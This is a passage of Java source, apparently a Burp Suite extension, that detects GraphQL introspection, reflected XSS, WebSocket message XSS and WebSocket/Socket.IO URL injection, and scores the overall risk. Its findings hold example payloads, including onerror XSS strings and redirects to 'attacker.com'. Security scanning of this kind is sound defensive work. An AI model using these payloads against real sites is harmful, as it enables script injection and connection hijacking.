                VulnerabilityInfo vuln = new VulnerabilityInfo();
                vuln.type = "GraphQL Introspection Enabled";
                vuln.severity = "Low";
                vuln.confidence = 95.0;
                vuln.description = "GraphQL introspection is enabled. Attacker can discover " +
                    "all types, fields, and mutations to find injection points.";
                vuln.parameter = "query";
                vuln.payload = "{__schema{types{name,fields{name}}}}";
                vuln.remediation = "Disable introspection in production. Use allowlist for queries.";
                vulns.add(vuln);
            }

            // Check for user input in GraphQL response that could lead to XSS
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            for (IParameter param : reqInfo.getParameters()) {
                String paramValue = param.getValue();
                if (paramValue != null && paramValue.length() > 3 &&
                    responseBody.contains(paramValue)) {

                    // Check if response is rendered as HTML
                    IResponseInfo respInfo = helpers.analyzeResponse(requestResponse.getResponse());
                    String contentType = "";
                    for (String header : respInfo.getHeaders()) {
                        if (header.toLowerCase().startsWith("content-type:")) {
                            contentType = header.toLowerCase();
                            break;
                        }
                    }

                    if (contentType.contains("html")) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "GraphQL Reflected XSS";
                        vuln.severity = "High";
                        vuln.confidence = 70.0;
                        vuln.description = "User input in GraphQL query is reflected in HTML response. " +
                            "Parameter '" + param.getName() + "' may be vulnerable to XSS.";
                        vuln.parameter = param.getName();
                        vuln.payload = "mutation{updateProfile(bio:\"<img src=x onerror=alert(1)>\")}";
                        vuln.remediation = "Encode GraphQL field outputs before HTML rendering. " +
                            "Use parameterized queries.";
                        vulns.add(vuln);
                    }
                }
            }

        } catch (Exception e) {
            callbacks.printError("[GraphQL] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== WEBSOCKET ANALYSIS ====================

    /**
     * Analyze for WebSocket XSS vulnerabilities
     */
    private List<VulnerabilityInfo> analyzeWebSocket(String responseBody, String jsCode,
                                                      IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Check for WebSocket creation
            Matcher wsMatcher = WEBSOCKET_CREATE.matcher(jsCode);

            if (wsMatcher.find()) {
                // Check for unsafe message handling
                Pattern wsHandler = Pattern.compile(
                    "\\.onmessage\\s*=|addEventListener\\s*\\(\\s*['\"]message['\"]",
                    Pattern.CASE_INSENSITIVE
                );

                if (wsHandler.matcher(jsCode).find()) {
                    // Check for unsafe sinks in WebSocket handler
                    boolean hasUnsafeSink = jsCode.contains(".innerHTML") ||
                                           jsCode.contains("document.write") ||
                                           jsCode.contains("eval(");

                    if (hasUnsafeSink) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "WebSocket Message XSS";
                        vuln.severity = "High";
                        vuln.confidence = 70.0;
                        vuln.description = "WebSocket message handler uses unsafe DOM sinks. " +
                            "If attacker can inject WebSocket messages, XSS is possible.";
                        vuln.parameter = "WebSocket message data";
                        vuln.payload = "ws.send('{\"html\":\"<img src=x onerror=alert(1)>\"}')";
                        vuln.remediation = "Validate and sanitize WebSocket messages. " +
                            "Never use innerHTML with WebSocket data.";
                        vulns.add(vuln);
                    }
                }

                // Check for WebSocket URL injection
                int wsStart = wsMatcher.end();
                int wsUrlEnd = jsCode.indexOf(")", wsStart);
                if (wsUrlEnd > wsStart) {
                    String wsUrl = jsCode.substring(wsStart, wsUrlEnd);

                    // Check if URL is built from user input
                    if (wsUrl.contains("+") || wsUrl.contains("`") ||
                        wsUrl.contains("location.") || wsUrl.contains("document.")) {

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "WebSocket URL Injection";
                        vuln.severity = "High";
                        vuln.confidence = 65.0;
                        vuln.description = "WebSocket URL constructed dynamically. " +
                            "Attacker may redirect WebSocket to malicious server.";
                        vuln.parameter = "WebSocket URL parameter";
                        vuln.payload = "?wsHost=attacker.com";
                        vuln.remediation = "Hardcode WebSocket URLs or validate against allowlist.";
                        vulns.add(vuln);
                    }
                }
            }

            // Check for Socket.IO specific issues
            if (jsCode.contains("io(") || jsCode.contains("socket.connect")) {
                boolean hasAutoConnect = !jsCode.contains("autoConnect: false") &&
                                        !jsCode.contains("autoConnect:false");

                if (hasAutoConnect && (jsCode.contains("location.") || jsCode.contains("document."))) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "Socket.IO URL Injection";
                    vuln.severity = "Medium";
                    vuln.confidence = 60.0;
                    vuln.description = "Socket.IO connects automatically and URL may be injectable. " +
                        "Check if connection URL is derived from user-controlled values.";
                    vuln.parameter = "Socket.IO URL";
                    vuln.payload = "io('wss://attacker.com')";
                    vuln.remediation = "Use hardcoded Socket.IO URLs. Disable autoConnect.";
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[WebSocket] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== HELPER METHODS ====================

    /**
     * Extract JavaScript code from HTML response
     */
    private String extractJavaScript(String html) {
        StringBuilder js = new StringBuilder();

        // Extract inline scripts
        Pattern scriptPattern = Pattern.compile(
            "<script[^>]*>([\\s\\S]*?)</script>",
            Pattern.CASE_INSENSITIVE
        );
        Matcher matcher = scriptPattern.matcher(html);
        while (matcher.find()) {
            js.append(matcher.group(1)).append("\n");
        }

        // Extract event handlers
        Pattern eventPattern = Pattern.compile(
            "\\s(on\\w+)\\s*=\\s*[\"']([^\"']*)[\"']",
            Pattern.CASE_INSENSITIVE
        );
        Matcher eventMatcher = eventPattern.matcher(html);
        while (eventMatcher.find()) {
            js.append(eventMatcher.group(2)).append("\n");
        }

        // Extract javascript: URLs
        Pattern jsUrlPattern = Pattern.compile(
            "href\\s*=\\s*[\"']javascript:([^\"']*)[\"']",
            Pattern.CASE_INSENSITIVE
        );
        Matcher jsUrlMatcher = jsUrlPattern.matcher(html);
        while (jsUrlMatcher.find()) {
            js.append(jsUrlMatcher.group(1)).append("\n");
        }

        return js.toString();
    }

    // ==================== RESULT CLASSES ====================

    /**
     * Container for all modern XSS analysis results
     */
    public static class ModernXSSResult {
        public List<VulnerabilityInfo> domClobberingVulns = new ArrayList<>();
        public List<VulnerabilityInfo> mxssVulns = new ArrayList<>();
        public List<VulnerabilityInfo> protoPollutionVulns = new ArrayList<>();
        public List<VulnerabilityInfo> postMessageVulns = new ArrayList<>();
        public List<VulnerabilityInfo> serviceWorkerVulns = new ArrayList<>();
        public List<VulnerabilityInfo> importMapVulns = new ArrayList<>();
        public List<VulnerabilityInfo> trustedTypesVulns = new ArrayList<>();
        public List<VulnerabilityInfo> graphqlVulns = new ArrayList<>();
        public List<VulnerabilityInfo> websocketVulns = new ArrayList<>();

        public double overallRiskScore = 0.0;
        public String overallRiskLevel = "Low";

        public void calculateOverallRisk() {
            int totalVulns = 0;
            double totalScore = 0.0;

            List<List<VulnerabilityInfo>> allVulns = Arrays.asList(
                domClobberingVulns, mxssVulns, protoPollutionVulns,
                postMessageVulns, serviceWorkerVulns, importMapVulns,
                trustedTypesVulns, graphqlVulns, websocketVulns
            );

            for (List<VulnerabilityInfo> vulnList : allVulns) {
                for (VulnerabilityInfo vuln : vulnList) {
                    totalVulns++;
                    double severityScore = 0;
                    switch (vuln.severity.toLowerCase()) {
                        case "critical": severityScore = 100; break;
                        case "high": severityScore = 75; break;
                        case "medium": severityScore = 50; break;
                        case "low": severityScore = 25; break;
                    }
                    totalScore += (severityScore * vuln.confidence / 100.0);
                }
            }

            if (totalVulns > 0) {
                overallRiskScore = totalScore / totalVulns;
                if (overallRiskScore >= 75) overallRiskLevel = "Critical";
                else if (overallRiskScore >= 50) overallRiskLevel = "High";
                else if (overallRiskScore >= 25) overallRiskLevel = "Medium";
                else overallRiskLevel = "Low";
            }
        }

        public List<VulnerabilityInfo> getAllVulnerabilities() {
            List<VulnerabilityInfo> all = new ArrayList<>();
            all.addAll(domClobberingVulns);
            all.addAll(mxssVulns);
            all.addAll(protoPollutionVulns);
            all.addAll(postMessageVulns);
            all.addAll(serviceWorkerVulns);
            all.addAll(importMapVulns);
            all.addAll(trustedTypesVulns);
            all.addAll(graphqlVulns);
            all.addAll(websocketVulns);
            return all;
        }

        public int getTotalCount() {
            return getAllVulnerabilities().size();
        }
    }

    /**
     * Individual vulnerability information
     */
    public static class VulnerabilityInfo {
        public String type;
        public String severity;
        public double confidence;
        public String description;
        public String parameter;
        public String payload;
        public String remediation;

        @Override
        public String toString() {
            return String.format("[%s] %s (Confidence: %.0f%%) - %s",
                severity, type, confidence, parameter);
        }
    }
}
